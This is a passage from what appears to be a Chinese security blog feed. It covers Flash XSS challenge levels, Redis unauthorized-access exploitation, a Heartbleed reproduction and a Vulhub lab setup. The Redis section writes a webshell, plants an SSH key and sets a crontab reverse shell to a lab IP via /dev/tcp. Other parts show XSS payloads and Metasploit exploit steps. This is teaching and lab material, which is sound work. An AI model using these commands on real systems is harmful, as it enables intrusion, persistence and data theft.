class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p><p><img src="/2019/05/20/XSS挑战之旅/1558313314215.png" alt="1558313314215"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：这里和上两关</p><p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p><p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>首先找到getURL函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558315194981.png" alt="1558315194981"></p><p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p><p><img src="/2019/05/20/XSS挑战之旅/1558315623256.png" alt="1558315623256"></p><p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558316052078.png" alt="1558316052078"></p><p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558316206643.png" alt="1558316206643"></p><p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558343919410.png" alt="1558343919410"></p><p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问漏洞</title>
      <link href="/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p><code>Redis</code>是一个开源的，基于<code>ANSI C语言</code>开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统</p><h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p> Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 <code>Redis</code>服务本身的特性及其运维不当造成的。</p><p><code>Redis</code>的默认配置文件中，会绑定 <code>0.0.0.0:6379</code>，这样 <code>Redis</code>会监听一切 <code>IP</code>，接收一切 <code>IP</code>的请求。如果没有采用添加防火墙规则等安全策略屏蔽非信任来源 <code>IP</code>访问，就会使 <code>Redis</code>服务暴露在公网，被任意用户进行登录。</p><p><code>Redis</code>默认没有设置密码认证，没有进行相应的密码验证会导致任意 用户免密登录 <code>Redis</code>，从而读取 <code>Redis</code>的数据、篡改 <code>Redis</code>的数据或者更高危的操作。</p><a id="more"></a><h2 id="二、Redis安装"><a href="#二、Redis安装" class="headerlink" title="二、Redis安装"></a>二、Redis安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><h2 id="二、Redis服务器配置"><a href="#二、Redis服务器配置" class="headerlink" title="二、Redis服务器配置"></a>二、Redis服务器配置</h2><p>修改配置文件 /opt/redis/redis.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1#监听任意ip</span><br><span class="line">protected-mode no#关闭保护模式</span><br></pre></td></tr></table></figure><p>启动redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf #重新加载配置文件</span><br></pre></td></tr></table></figure><h2 id="三、Redis客户端连接"><a href="#三、Redis客户端连接" class="headerlink" title="三、Redis客户端连接"></a>三、Redis客户端连接</h2><p>客户端（本地宿主机）连接redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><h2 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info#版本信息，服务器信息等</span><br><span class="line">set name &quot;hi&quot;#设置变量</span><br><span class="line">get name #取值</span><br><span class="line">flushall #删除数据库（一般情况下不要用！）</span><br><span class="line">keys * #查看所有的键</span><br><span class="line">CONFIG GET dir/dbfilename#获取默认的Reids目录和rdb的文件名，在修改前先获取，然后走的时候再恢复</span><br><span class="line">CONFIG SET dir/dbfilename#修改默认的Reids目录和rdb的文件名</span><br><span class="line">save#执行同步保存操作，将当前Redis实例的所有数据快照(snapshot)以RDB文件的形式保存到硬盘。</span><br><span class="line">bgsave#fork一个子进程来创建RDB文件，父进程可以继续处理命令请求。</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>save：会阻塞redis服务器进程，直到创建RDB文件完毕为止；（在此期间进程不能处理任何请求）<br>bgsave：命令执行之后立即返回 OK ，然后Redis fork 出一个新子进程，原来的Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出</p></blockquote><h2 id="五、攻击利用方式"><a href="#五、攻击利用方式" class="headerlink" title="五、攻击利用方式"></a>五、攻击利用方式</h2><h3 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="1. 写Webshell"></a>1. 写Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/#将rdb文件保存在/var/www/中</span><br><span class="line">CONFIG SET dbfilename redis.php#将rdb文件名修改为redis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;#往redis.php中写木马</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><h3 id="2-ssh配置免密登录"><a href="#2-ssh配置免密登录" class="headerlink" title="2. ssh配置免密登录"></a>2. ssh配置免密登录</h3><p>条件：</p><ul><li>Redis服务使用ROOT账号启动 </li><li>服务器开放SSH服务，而且允许密钥登录，即可远程写入一个公钥，直接登录远程服务器</li></ul><p>先在渗透主机上生成 <code>ssh</code>的私钥与公钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa//一直回车即可</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt# 保存公钥到hack.txt中</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # 把公钥写入到redis主机</span><br></pre></td></tr></table></figure><p>登陆访问redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><p>修改RDB存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>ssh远程连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure><h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>crontab周期性执行任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l#查看当前任务</span><br><span class="line">-r#删除任务</span><br><span class="line">-e#编辑</span><br><span class="line">6部分：分钟 小时 天 月 星期 命令/脚本</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure><p>查看当前任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">该文件内容等同于</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>写入crontab定时任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure><p>攻击者服务端开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure><p><img src="/2019/05/15/Redis未授权访问漏洞/1557925558674.png" alt="1557925558674"></p><h2 id="六、修复"><a href="#六、修复" class="headerlink" title="六、修复"></a>六、修复</h2><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>避免使用<code>root</code>用户身份启动<code>Redis</code>服务，选择权限较低的用户运行<code>rides</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><h4 id="禁止命令"><a href="#禁止命令" class="headerlink" title="禁止命令"></a>禁止命令</h4><p>通过修改配置文件来禁止一些高风险的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="添加密码认证"><a href="#添加密码认证" class="headerlink" title="添加密码认证"></a>添加密码认证</h4><p>通过配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure><p>也可以通过 <code>Redis</code>的命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure><h4 id="禁止外网访问"><a href="#禁止外网访问" class="headerlink" title="禁止外网访问"></a>禁止外网访问</h4><p>通过防火墙等配置来禁止外网访问。</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>Redis</code>匿名访问漏洞由不安全的运维配置引起的，作为配置 <code>Redis</code>的开发人员或运维人员一定要有一定的安全意识，才能更好的实现真正的安全。</p><h2 id="八、参考文章："><a href="#八、参考文章：" class="headerlink" title="八、参考文章："></a>八、参考文章：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">Redis匿名访问漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-0160-心脏滴血漏洞</title>
      <link href="/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/01/CVE-2014-0160-%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><p><strong>CVE ID</strong>:</p><p>CVE-2014-0160</p><p><strong>漏洞范围</strong>：</p><p>OpenSSL1.0.1</p><p><strong>漏洞成因</strong>：</p><p>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</p><a id="more"></a><p><strong>漏洞危害</strong>：</p><p>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><p>环境： bee-box虚拟机(已集成该漏洞环境)<br>bee-box虚拟机下载地址：<a href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank" rel="noopener">链接</a></p><h3 id="1-使用工具进行利用"><a href="#1-使用工具进行利用" class="headerlink" title="1. 使用工具进行利用"></a>1. 使用工具进行利用</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><ol><li><p>首先确定目标和端口信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676583087.png" alt="1556676583087"></p><p>可以看到存在漏洞的端口为8443</p></li><li><p>使用nmap脚本进行漏洞检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556676900297.png" alt="1556676900297"></p><p>可以看到该漏洞存在</p></li></ol><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><ol><li><p>使用msf的exp进行漏洞利用</p><ol><li><p>打开msfconsole</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677575168.png" alt="1556677575168"></p></li><li><p>查找heartbleed模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677615995.png" alt="1556677615995"></p></li><li><p>使用第一个模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssl/openssl_heartbleed</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677661603.png" alt="1556677661603"></p><p>第二个模块是用来</p></li><li><p>查看设置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshow options</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677730237.png" alt="1556677730237"></p></li><li><p>设置RHOST，RPORT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.11.59</span><br><span class="line">set RPORT 443</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677783208.png" alt="1556677783208"></p></li><li><p>设置VERBOSRE，值为true才能看到泄漏的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set</span><br><span class="line">set VERBOSE true</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556677911981.png" alt="1556677911981"></p></li><li><p>执行paload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>如果有人正在登陆该web应用，可能获取到账号密码等信息</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556684475023.png" alt="1556684475023"></p><p>没有获取到数据是因为没有人登陆该应用或者登陆较少</p><p>下图是之前获取到数据的示例</p><p><img src="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/1556679300981.png" alt="1556679300981"></p></li></ol></li></ol><h3 id="2-使用python脚本"><a href="#2-使用python脚本" class="headerlink" title="2. 使用python脚本"></a>2. 使用python脚本</h3><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/poc.py" target="_blank" rel="noopener">PoC</a></h4><p>修改 <code>poc.py</code> 中 <code>check</code> 函数的地址和端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">check(&apos;192.168.59.103&apos;, 443)</span><br></pre></td></tr></table></figure><p>然后执行poc.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py</span><br></pre></td></tr></table></figure><p>如果看到 <code>Heartbleed OpenSSL</code> 则代表存在漏洞。</p><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a><a href="https://github.com/Medicean/VulApps/blob/master/o/openssl/heartbleed_CVE-2014-0160/exp.py" target="_blank" rel="noopener">Exp</a></h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 192.168.59.103</span><br></pre></td></tr></table></figure><p>读取到的信息在当前目录下的 <code>result.txt</code> 内。</p><blockquote><p>具体使用参数请使用 <code>python exp.py -h</code></p></blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/u/13c720cf85fc" target="_blank" rel="noopener">ch3ckr</a>： <a href="https://www.jianshu.com/p/08600e2f4530" target="_blank" rel="noopener">https://www.jianshu.com/p/08600e2f4530</a></p><p><a href="https://github.com/Medicean" target="_blank" rel="noopener">Medicean</a>：<a href="https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker+Vulhub搭建漏洞测试靶场</title>
      <link href="/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/"/>
      <url>/2019/04/28/%E4%BD%BF%E7%94%A8Docker-Vulhub%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Vulhub是一个基于<code>docker</code>和<code>docker-compose</code>的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><a id="more"></a><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>配置国内加速器，可以更快的拉取镜像资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io</span><br></pre></td></tr></table></figure><h2 id="三、安装docker-compose"><a href="#三、安装docker-compose" class="headerlink" title="三、安装docker-compose"></a>三、安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://bootstrap.pypa.io/get-pip.py | python//安装PIP</span><br><span class="line">pip install docker-compose//安装docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、下载Vulhub"><a href="#四、下载Vulhub" class="headerlink" title="四、下载Vulhub"></a>四、下载Vulhub</h2><p>安装完成docker和docker-compose后，拉取Vulhub到本地任意目录即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure><p>安装完成后，执行<code>docker-compose -v</code>，有返回则说明安装成功。</p><h2 id="五、启动漏洞环境"><a href="#五、启动漏洞环境" class="headerlink" title="五、启动漏洞环境"></a>五、启动漏洞环境</h2><p>docker-compose会自动查找当前目录下的配置文件（默认文件名为<code>docker-compose.yml</code>），并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。</p><p>在这里演示Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞，进入<code>drupal/CVE-2014-3704/</code>目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /your-Vuln-Path/drupal/CVE-2014-3704/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到Drupal的安装页面，使用默认配置安装即可。</p><p>其中，Mysql数据库名填写<code>drupal</code>，数据库用户名、密码为<code>root</code>，地址为<code>mysql</code>：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803517373.png" alt="1554803517373"></p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803658364.png" alt="1554803658364"></p><p>安装完成后，访问首页：</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554803788919.png" alt="1554803788919"></p><h2 id="六、漏洞测试"><a href="#六、漏洞测试" class="headerlink" title="六、漏洞测试"></a>六、漏洞测试</h2><h3 id="1-cmsmap扫描cms漏洞"><a href="#1-cmsmap扫描cms漏洞" class="headerlink" title="1. cmsmap扫描cms漏洞"></a>1. cmsmap扫描cms漏洞</h3><ol><li><p>下载cmsmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap.git</span><br></pre></td></tr></table></figure></li><li><p>安装parse模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install parse</span><br></pre></td></tr></table></figure></li><li><p>使用python运行扫描脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cmsmap.py http://192.168.10.18:8080</span><br></pre></td></tr></table></figure><p>得到漏洞详情</p><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554804365543.png" alt="1554804365543"></p></li></ol><h3 id="2-使用metasploit进行漏洞利用"><a href="#2-使用metasploit进行漏洞利用" class="headerlink" title="2. 使用metasploit进行漏洞利用"></a>2. 使用metasploit进行漏洞利用</h3><ol><li><p>启动metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure></li><li><p>搜索可利用模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2//使用该模块</span><br></pre></td></tr></table></figure><p><img src="/2019/04/28/使用Docker-Vulhub搭建漏洞测试靶场/1554807336176.png" 